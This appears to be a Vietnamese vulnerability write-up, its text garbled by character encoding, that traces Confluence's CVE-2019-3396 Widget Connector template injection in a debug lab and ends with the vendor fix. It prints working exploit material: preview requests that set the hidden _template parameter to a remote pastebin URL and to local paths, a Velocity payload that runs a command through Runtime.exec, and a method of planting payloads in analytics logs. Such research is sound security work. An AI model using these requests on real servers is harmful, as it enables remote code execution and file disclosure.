# Confluence unauthorize template injection (CVE-2019-3396)

## I) Building
- Bug nÃ y xáº£y ra trÃªn cÃ¡c phiÃªn báº£n:
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 1.x.x, 2.x.x, 3.x.x, 4.x.x vÃ  5.x.x
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.0.x, 6.1.x, 6.2.x, 6.3.x, 6.4.x vÃ  6.5.x
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.6.x trÆ°á»›c 6.6.12
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.7.x, 6.8.x, 6.9.x, 6.10.x vÃ  6.11.x
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.12.x trÆ°á»›c 6.12.3
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.13.x trÆ°á»›c 6.13.3
  * Táº¥t cáº£ cÃ¡c phiÃªn báº£n 6.14.x trÆ°á»›c 6.14.2
- Sau khi táº£i source vá» cÃ¡c báº¡n cáº§n:
  * Sá»­a giÃ¡ trá»‹ `confluence.home`vá» Ä‘á»‹a chá»‰ confluence home á»Ÿ file ./confluence/WEB-INF/classes/confluence-init.properties
  * ThÃªm giÃ¡ trá»‹ `CATALINA_OPTS` Ä‘á»ƒ chÆ°Æ¡ng trÃ¬nh cÃ³ thá»ƒ cháº¡y á»Ÿ cháº¿ Ä‘á»™ remote debug
  
Vá»›i windown, file ./bin/setenv.bat 
```
set CATALINA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
```
vá»›i linux, file ./bin/setenv.sh
```
CATALINA_OPTS="-Xrunjdwp:transport=dt_socket,suspend=n,server=y,address=5005 ${CATALINA_OPTS}"  
```
  * Táº¡i IDE (Intellij) ta táº¡o má»™t Debug Configurations: `Remote JVM Debug`  vá»›i giÃ¡ trá»‹ `host` vÃ  `port` lÃ  localhost:5005 vÃ  `Command line aguments for remote JVM`
```
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
```
  * Ta cÃ³ thá»ƒ sá»­ dá»¥ng Postgresql lÃ m database:
```
$ su - postgres
postgres@ubuntu:~$ psql -U postgres
postgres@ubuntu:~$ psql -U postgres
psql (10.6 (Ubuntu 10.6-0ubuntu0.18.04.1))
Type "help" for help.
 
postgres=# CREATE USER wiki WITH PASSWORD 'wiki';
CREATE ROLE
postgres=# CREATE DATABASE wiki OWNER wiki;
CREATE DATABASE
postgres=# GRANT ALL PRIVILEGES ON DATABASE jira TO wiki;
GRANT
```
  * Ta cáº§n add giÃ³i jar: ./confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-x.x.x.jar, ./confluence/WEB-INF/lib/confluence-x.x.x.jar, ./confluence/WEB-INF/lib/velocity-x.x.x-atlassian-x.jar vÃ o lib Ä‘á»ƒ khi debug ta cÃ³ thá»ƒ tháº¥y souce cáº§n thiáº¿t.
  

  * Ta tiáº¿n hÃ nh cháº¡y file ./bin/start-confluence.bat vÃ  cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm [hÆ°á»›ng dáº«n nÃ y](https://developer.atlassian.com/server/confluence/building-confluence-from-source-code/) Ä‘á»ƒ install tá»« source.
## II) PhÃ¢n tÃ­ch
- Sau khi Ä‘á»c Description, ta cÃ³ thá»ƒ biáº¿t bug nÃ y báº¯t Ä‘áº§u tá»« tÃ­nh nÄƒng `Widget Connector` tháº¿ nÃªn mÃ¬nh google ngay Ä‘á»ƒ biáº¿t tÃ­nh nÄƒng nÃ y lÃ  gÃ¬, vÃ  lÃ m sao Ä‘á»ƒ sá»­ dá»¥ng:

  ![2](https://user-images.githubusercontent.com/63145078/116819131-d319e380-ab98-11eb-846f-1ae8a0ca0ac2.png)
  <i> vÃ o edit má»™t page <i/>
 
  ![3](https://user-images.githubusercontent.com/63145078/116819140-db721e80-ab98-11eb-8048-f0a2d9061f3f.png)<br>
  <i> Chá»n Orther macros<i/>
  
  ![4](https://user-images.githubusercontent.com/63145078/116819155-eb89fe00-ab98-11eb-8d95-30d2c5498b1c.png)
  <i>Chá»n Widget connector <i/>
  
  ![image](https://user-images.githubusercontent.com/63145078/116819231-59cec080-ab99-11eb-8c3d-876e9a04b527.png)
  
- MÃ¬nh chá»n bá»«a cÃ¡c thÃ´ng sá»‘ rá»“i áº¥n vÃ o preview, sau Ä‘Ã³ chuyá»ƒn qua burp Ä‘á»ƒ xem cÃ³ gÃ¬ hay khÃ´ng. 
  ![image](https://user-images.githubusercontent.com/63145078/116819395-2476a280-ab9a-11eb-9e23-78ed969b6425.png)
- á» gÃ³i tin nÃ y, mÃ¬nh tháº¥y cÃ³ má»™t thÃ´ng sá»‘ `"pluginKey":"com.atlassian.confluence.extra.widgetconnector"` váº­y nÃªn mÃ¬nh Ä‘oÃ¡n ráº±ng tÃ­nh nÄƒng `Widget Connector` Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a á»Ÿ class `com.atlassian.confluence.extra.widgetconnector` váº­y nÃªn mÃ¬nh Ä‘Ã£ tÃ¬m kiáº¿m trong path xem cÃ³ gÃ³i jar nÃ o kháº£ nghi hay khÃ´ng.  

![image](https://user-images.githubusercontent.com/63145078/116819757-9ef3f200-ab9b-11eb-98e6-a44f85f96378.png)

- mÃ¬nh thá»­ add file ./confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-x.x.x.jar vÃ o lib cá»§a project Ä‘á»ƒ cÃ³ thá»ƒ Ä‘á»c source code vÃ  debug.

  ![1](https://user-images.githubusercontent.com/63145078/116822945-d4084080-abab-11eb-809b-09a57f71797c.png) <br>
  <i>CÃ¡ch add file jar vÃ o lib<i/>

- Má»Ÿ pack widgetconnector mÃ¬nh tháº¥y cÃ³ cáº£m tÃ¬nh vá»›i class `WidgetMacro` nÃªn mÃ¬nh Ä‘áº·t breakpoit táº¡i contructor vÃ  hÃ m execute cá»§a class nÃ y Ä‘á»ƒ xem khi mÃ¬nh sá»­ dá»¥ng tÃ­nh nÄƒng `Preview` thÃ¬ class nÃ y cÃ³ Ä‘Æ°á»£c gá»i hay khÃ´ng ğŸ•µï¸
  
  - ![image](https://user-images.githubusercontent.com/63145078/116855564-cbebe780-ac23-11eb-9490-c6be1f60346e.png)
  - HÃ m `execute` Ä‘Ã£ Ä‘Æ°á»£c gá»i, sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh gá»i tá»›i `DefaultRenderManager.getEmbeddedHtml` 
  - ![image](https://user-images.githubusercontent.com/63145078/116858333-677f5700-ac28-11eb-813c-9e7771e9aaab.png)

  - Ta tháº¥y Ä‘á»ƒ vÃ o Ä‘Æ°á»£c trong `if` ta cáº§n thá»a mÃ£n Ä‘iá»u kiá»‡n `widgetRenderer.matches(url)`. Ta tiáº¿n hÃ nh kiá»ƒm tra hÃ m `widgetRenderer.matches(url)` á»Ÿ class `YoutubeRenderer`
  - ![image](https://user-images.githubusercontent.com/63145078/116862662-50903300-ac2f-11eb-8374-44109c5afe17.png)
  - ![image](https://user-images.githubusercontent.com/63145078/116862836-8e8d5700-ac2f-11eb-8344-f0dd11177697.png)
  - NhÆ° váº­y mÃ¬nh cáº§n Ä‘á»ƒ parameter `url` lÃ  má»™t Ä‘Æ°á»ng dáº«n video cá»§a youtube (hoáº·c Vimeo, Twitter, ...). MÃ¬nh set `url` thÃ nh url cá»§a má»™t video youtube báº¥t ká»³ vÃ  chÆ°Æ¡ng trÃ¬nh Ä‘Ã£ nháº£y vÃ o cÃ¢u `if` sau Ä‘Ã³ gá»i tá»›i hÃ m `widgetRenderer.getEmbeddedHtml(url, params)` (class YoutubeRenderer)
  -  ![image](https://user-images.githubusercontent.com/63145078/116863777-0019d500-ac31-11eb-9dab-70c0f8780bac.png)
  -  ChÆ°Æ¡ng trÃ¬nh nháº£y tá»›i hÃ m `setDefaultParam` táº¡i Ä‘Ã¢y ta cÃ³ tháº¥y má»™t hidden params `_template` cÃ³ váº» kháº£ nghi :)
  -  ![image](https://user-images.githubusercontent.com/63145078/116864154-99e18200-ac31-11eb-8342-bd62bb6e89d9.png)
  -  Sau khi thoÃ¡t khá»i hÃ m `setDefaultParam`, chÆ°Æ¡ng trÃ¬nh gá»i tá»›i hÃ m `DefaultVelocityRenderService.render`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864312-dd3bf080-ac31-11eb-895b-c418ee740a2f.png)
  -  Tiáº¿p tá»¥c qua hÃ m `getRenderedTemplate` vÃ  `VelocityUtils.getRenderedTemplate(String templateName, Map<?, ?> contextMap)`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864392-f93f9200-ac31-11eb-8e05-dea6331b54c8.png)
  -  ![image](https://user-images.githubusercontent.com/63145078/116864542-373cb600-ac32-11eb-86b0-d454d5c076c6.png)
  -  Tiáº¿p tá»›i ` VelocityUtils.getRenderedTemplate(String templateName, Context context)` vÃ  `getRenderedTemplateWithoutSwallowingErrors(templateName, context)`
  -  ![image](https://user-images.githubusercontent.com/63145078/116864892-ca75eb80-ac32-11eb-94f8-8c42f0518c78.png)
  -  HÃ m `renderTemplateWithoutSwallowingErrors` 
  -  ![image](https://user-images.githubusercontent.com/63145078/116864932-deb9e880-ac32-11eb-8d03-6ec380dcfdab.png)
  -  ChÆ°Æ¡ng trÃ¬nh gá»i hÃ m `getTemplate` rá»“i tá»›i `VelocityEngine.getTemplate` vÃ  `RuntimeInstance.getTemplate`,  táº¡i Ä‘Ã¢y ta tháº¥y chÆ°Æ¡ng trÃ¬nh gá»i hÃ m `getResource` vá»›i tham sá»‘ Ä‘áº§u vÃ o chÃ­nh lÃ  giÃ¡ trá»‹ cá»§a  params `_template`. Vá»›i java, hÃ m `getResource` cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ load resource á»Ÿ dáº¡ng file local hoáº·c lÃ  má»™t tiá»‡p á»Ÿ trÃªn internet (thÃ´ng qua giao thá»©c HTTP). 
  -  Dá»«ng láº¡i vÃ  suy nghÄ©: Ä‘iá»u nÃ y pháº£i chÄƒng cho phÃ©p attacker Ä‘Æ°a má»™t template (tá»« local server hoáº·c tá»« host cá»§a attacker) báº¥t ká»³ vÃ o chÆ°Æ¡ng trÃ¬nh báº±ng cÃ¡ch chÃ¨n thÃªm params `_template` vÃ o request hay sao ??
  -  ![image](https://user-images.githubusercontent.com/63145078/116865297-8d5e2900-ac33-11eb-935c-fad727571d7f.png)
  -  ChÃºng ta tiáº¿p tá»¥c trace ngÆ°á»£c láº¡i, Ä‘á»ƒ xem sau khi cÃ³ Ä‘Æ°á»£c template thÃ¬ chÆ°Æ¡ng trÃ¬nh xá»­ lÃ½ tháº¿ nÃ o:
  -  Sau khi Ä‘Ã£ cÃ³ template, chÆ°Æ¡ng trÃ¬nh gá»i hÃ m `VelocityUtils.renderTemplateWithoutSwallowingErrors(template, context, writer);`
  -  ![image](https://user-images.githubusercontent.com/63145078/116865899-b4692a80-ac34-11eb-9dc4-bc875c6b5736.png)
  -  Rá»“i sau Ä‘Ã³ tá»›i `template.merge(context, writer);`
  
  ```ruby
  public void merge(Context context, Writer writer, List macroLibraries) throws ResourceNotFoundException, ParseErrorException, MethodInvocationException {
        if (this.errorCondition != null) {
            throw this.errorCondition;
        } else if (this.data == null) {
            String msg = "Template.merge() failure. The document is null, most likely due to parsing error.";
            throw new RuntimeException(msg);
        } else {
            InternalContextAdapterImpl ica = new InternalContextAdapterImpl(context);
            ica.setMacroLibraries(macroLibraries);
            if (macroLibraries != null) {
                for(int i = 0; i < macroLibraries.size(); ++i) {
                    try {
                        this.rsvc.getTemplate((String)macroLibraries.get(i));
                    } catch (ResourceNotFoundException var17) {
                        this.rsvc.getLog().error("template.merge(): cannot find template " + (String)macroLibraries.get(i));
                        throw var17;
                    } catch (ParseErrorException var18) {
                        this.rsvc.getLog().error("template.merge(): syntax error in template " + (String)macroLibraries.get(i) + ".");
                        throw var18;
                    } catch (Exception var19) {
                        throw new RuntimeException("Template.merge(): parse failed in template  " + (String)macroLibraries.get(i) + ".", var19);
                    }
                }
            }

            if (this.provideScope) {
                ica.put(this.scopeName, new Scope(this, ica.get(this.scopeName)));
            }

            try {
                ica.pushCurrentTemplateName(this.name);
                ica.setCurrentResource(this);
                ((SimpleNode)this.data).render(ica, writer);      ### POC cÃ³ thá»ƒ Ä‘Æ°á»£c render á»Ÿ Ä‘Ã¢y  ###
            } catch (StopCommand var20) {
                if (!var20.isFor(this)) {
                    throw var20;
                }

                if (this.rsvc.getLog().isDebugEnabled()) {
                    this.rsvc.getLog().debug(var20.getMessage());
                }
            } catch (IOException var21) {
                throw new VelocityException("IO Error rendering template '" + this.name + "'", var21);
            } finally {
                ica.popCurrentTemplateName();
                ica.setCurrentResource((Resource)null);
                if (this.provideScope) {
                    Object obj = ica.get(this.scopeName);
                    if (obj instanceof Scope) {
                        Scope scope = (Scope)obj;
                        if (scope.getParent() != null) {
                            ica.put(this.scopeName, scope.getParent());
                        } else if (scope.getReplaced() != null) {
                            ica.put(this.scopeName, scope.getReplaced());
                        } else {
                            ica.remove(this.scopeName);
                        }
                    }
                }

            }

        }
    }
  ```
  - Táº¡i Ä‘Ã¢y ta tháº¥y chÆ°Æ¡ng trÃ¬nh cÃ³ gá»i tá»›i `SimpleNode.render`, HÃ m nÃ y sá»­ dá»¥ng template Velocity Ä‘á»ƒ parse template. Tá»›i Ä‘Ã¢y ta cÃ³ thá»ƒ tháº¥y cÃ³ thá»ƒ viáº¿t PoC RCE Ä‘Æ°á»£c rá»“i:
 
 GÃ³i POST request khi yÃªu cáº§u tÃ­nh nÄƒng `Preview`
  ```
  POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Cookie: seraph.confluence=; JSESSIONID=
Connection: close

{
  "contentId":"622594",
  "macro": {
      "name":"widget",
      "body":"","params": {
        "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
        "width":"10",
        "height":"10",
        "_template":"https://pastebin.com/raw/JPEpiuLG"
        }
  }
}
  ```
  file payload
  ```
  #set($x="x")
  $x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
  ```
  - PoC Ä‘Ã£ cháº¡y thÃ nh cÃ´ng:
  - ![image](https://user-images.githubusercontent.com/63145078/116867871-f778cd00-ac37-11eb-94a7-0a16ffe406d4.png)

  ### Stack call
  ```
  WidgetMacro: execute
	-> DefaultRenderManager: getEmbeddedHtml
		-> YoutubeRenderer: getEmbeddedHtml
			-> DefaultVelocityRenderService: render -> getRenderedTemplate
				-> (confluence-6.12.2.jar) VelocityUtils: getRenderedTemplate -> getRenderedTemplate -> getRenderedTemplateWithoutSwallowingErrors -> renderTemplateWithoutSwallowingErrors -> getTemplate -> getVelocityEngine
					
					-> VelocityEngine: getTemplate
						-> RuntimeInstance: getResource 

				-> (confluence-6.12.2.jar) VelocityUtils: renderTemplateWithoutSwallowingErrors

					-> Template: merge
						=>  SimpleNode: render
  ```

NhÆ° váº­y lÃ  ta Ä‘Ã£ PoC láº¡i thÃ nh cÃ´ng bug nÃ y, nhÆ°ng trong trÆ°á»ng há»£p target lÃ  má»™t server chÄƒn outbount attacker khÃ´ng thá»ƒ get resource tá»« ngoÃ i internet chá»‰ cÃ³ thá»ƒ get resource lÃ  nhá»¯ng file trong local cá»§a server.

### Váº­y trong trÆ°á»ng há»£p Ä‘Ã³, lÃ m sao Ä‘á»ƒ cÃ³ thá»ƒ khai thÃ¡c ?

MÃ¬nh nháº­n Ä‘Æ°á»£c má»™t gá»£i Ã½ lÃ  báº±ng má»™t cÃ¡ch nÃ o Ä‘Ã³ user cÃ³ thá»ƒ inject payload vÃ o file log. ÄÃ¢y lÃ  má»™t Ã½ tÆ°á»Ÿng khÃ¡ hay, nÃªn mÃ¬nh báº¯t chÃ¢n lÃªn trÃ¡n tÃ¬m cÃ¡ch ngay.
  - MÃ¬nh báº¯t Ä‘áº§u xem cÃ¡c file log trong Confluence Home Ä‘á»ƒ xem chÃºng cÃ³ gÃ¬ Ä‘áº·c biá»‡t. MÃ¬nh xem cÃ¡c file log á»Ÿ ./shared-home/analytics-logs/ vÃ  tháº¥y cÃ³ má»™t sá»‘ key-value quen thuá»™c, cÃ³ váº» nhÆ° chÃºng Ä‘Æ°á»£c gá»­i tá»« phÃ­a client-side
  - ![image](https://user-images.githubusercontent.com/63145078/116901323-f9f11c00-ac63-11eb-9948-4975f92719a1.png)
  - MÃ¬nh tháº¥y cÃ³ gÃ³i `POST /rest/analytics/1.0/publish/bulk` cÃ³ gá»­i Ä‘i má»™t sá»‘ key-value nhÆ° trÃªn.
 ```
[{"name":"browser.metrics.navigation",
"properties":{
  "apdex":"0.5",
  "firstPaint":"528",
  "isInitial":"true",
  "journeyId":"9e60e71a-8ebe-478c-a638-ee9423f5798f",
  "key":"confluence.dashboard.view",
  "navigationType":"0",
  "readyForUser":"1117",
  "redirectCount":"0",
  "resourceLoadedEnd":"499",
  "resourceLoadedStart":90.35499999299645,
  "threshold":"1000",
  "unloadEventStart":"47",
  "unloadEventEnd":"47",
  "fetchStart":"25",
  "domainLookupStart":"25",
  "domainLookupEnd":"25",
  "connectStart":"25",
  "connectEnd":"25",
  "requestStart":"27",
  "responseStart":"28",
  "responseEnd":"37",
  "domLoading":"52",
  "domInteractive":"538",
  "domContentLoadedEventStart":"538",
  "domContentLoadedEventEnd":"691",
  "domComplete":"1176",
  "loadEventStart":"1176",
  "loadEventEnd":"1176",
  "userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
  "pageEnd":"531",
  "isBigPipeEnabled":"false",
  "serverDuration":"339",
  "requestCorrelationId":"36006c54d2919ecd",
  "resourceTiming":"{\"Ã¢ËœÂ \":[\"2,2i,2i,,,2i,,2i,2i,2i\",\"2,2i,31,2m,2k,2i,,2i,2i,2i\",\"2,2j,31,2m,2l,2j,,2j,2j,2j\",\"3,2l,2l,,,2l,,2l,2l,2l\",\"3,2l,2l,,,2l,,2l,2l,2l\",\"3,2m,2m,,,2m,,2m,2m,2m\",\"3,2n,2n,,,2n,,2n,2n,2n\",\"5,bz,cv,cv,c0,bz,,bz,bz,bz\",\"4,d6,d6,,,d6,,d6,d6,d6\",\"4,d7,d7,,,d7,,d7,d7,d7\",\"3,dq,dv,dr,dq,dq,,dq,dq,dq\",\"4,ej,ej,,,ej,,ej,ej,ej\",\"4,ej,ej,,,ej,,ej,ej,ej\",\"4,er,er,,,er,,er,er,er\",\"5,fl,fn,fn,fm,fl,,fl,fl,fl\",\"5,g9,ha,h9,gb,g9,,g9,g9,g9\",\"4,hv,hv,,,hv,,hv,hv,hv\",\"4,hv,hv,,,hv,,hv,hv,hv\",\"4,ik,ik,,,ik,,ik,ik,ik\",\"4,ik,ik,,,ik,,ik,ik,ik\",\"4,il,il,,,il,,il,il,il\",\"5,h4,ta,t0,pl,pk,,h6,h4,h4\"]}",
  "userTimingRaw":"{\"marks\":{},\"measures\":{}}","experiments":"[]"},"timeDelta":-5176
  }]
 ```
  - MÃ¬nh thá»­ thay tháº¿ má»™t sá»‘ value thÃ¬ tháº¥y cÃ³ value `resourceTiming` cÃ³ thá»ƒ tÃ¹y Ã½ chá»‰nh sá»­a mÃ  váº«n Ä‘Æ°á»£c Ä‘Æ°a vÃ o log
  - ![image](https://user-images.githubusercontent.com/63145078/116903622-d380b000-ac66-11eb-837a-f23273939ea5.png)
  - NhÆ° váº­y lÃ  ta Ä‘Ã£ cÃ³ thá»ƒ Ä‘Æ°a payload vÃ o file log náº±m trÃªn local cá»§a server.
  - Tá»« Ä‘Ã¢y ta cÃ³ thá»ƒ Ä‘á»c file ./confluence/WEB-INF/classes/confluence-init.properties Ä‘á»ƒ biáº¿t Ä‘Æ°á»£c vá»‹ trÃ­ cá»§a confluence home
  ```
  POST /rest/tinymce/1/macro/preview HTTP/1.1
    
{
"contentId":"1507329",
"macro":{
  "name":"widget",
  "body":"",
  "params":{
    "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
    "_template":"/../../WEB-INF/classes/confluence-init.properties",
    "width":"11",
    "height":"11"
    }
  }
}
  ```
  - Rá»“i tá»« Ä‘Ã³ tÃ¬m tá»›i vá»‹ trÃ­ file log cÃ³ chá»©a payload mÃ  mÃ¬nh Ä‘Ã£ inject vÃ o:

```  
POST /rest/tinymce/1/macro/preview HTTP/1.1
    
{
"contentId":"1507329",
"macro":{
  "name":"widget",
  "body":"",
  "params":{
    "url":"https://www.youtube.com/watch?v=WfDp-TkSoFY&ab_channel=TAPMusic",
    "_template":"file:C://Users/XXXXX...XXXXX/.confluence/shared-home/analytics-logs/bd0f2792fe0234be516b843e25d54a14.515465381.atlassian-analytics.log",
    "width":"11",
    "height":"11"
    }
  }
}
```
 - Náº¿u file log quÃ¡ lá»›n khÃ´ng thá»ƒ Ä‘Æ°a vÃ o template Ä‘á»ƒ parse ta cÃ³ thá»ƒ push log Ä‘á»ƒ file log Ä‘áº¡t giá»›i háº¡n kÃ­ch thÆ°á»›c, lÃºc Ä‘Ã³ há»‡ thá»‘ng tá»± Ä‘á»™ng ghi log sang file má»›i vÃ  attacker cÃ³ thá»ƒ nhÃ¢n cÃ³ há»™i file log má»›i cÃ³ kÃ­ch thÆ°á»›c chÆ°a lá»›n Ä‘á»ƒ inject payload Ä‘á»ƒ sá»­ dá»¥ng.
 
 ## III) Fix
 
  Táº¡i báº£n fix class WidgetMacro Ä‘Ã£ Ä‘Æ°á»£c viáº¿t thÃªm hÃ m `doSanitizeParameters` Ä‘á»ƒ xÃ³a param "_template" trÆ°á»›c khi gá»i `renderManager.getEmbeddedHtml(url, parameters);` 
  
 ![image](https://user-images.githubusercontent.com/63145078/116958444-da3e1000-acc4-11eb-855c-d64a9e965990.png)
 ![image](https://user-images.githubusercontent.com/63145078/116958650-841d9c80-acc5-11eb-8843-12f9a0435f06.png)
 ![image](https://user-images.githubusercontent.com/63145078/116958484-06599100-acc5-11eb-93c4-61a982a5a91f.png)

 



  

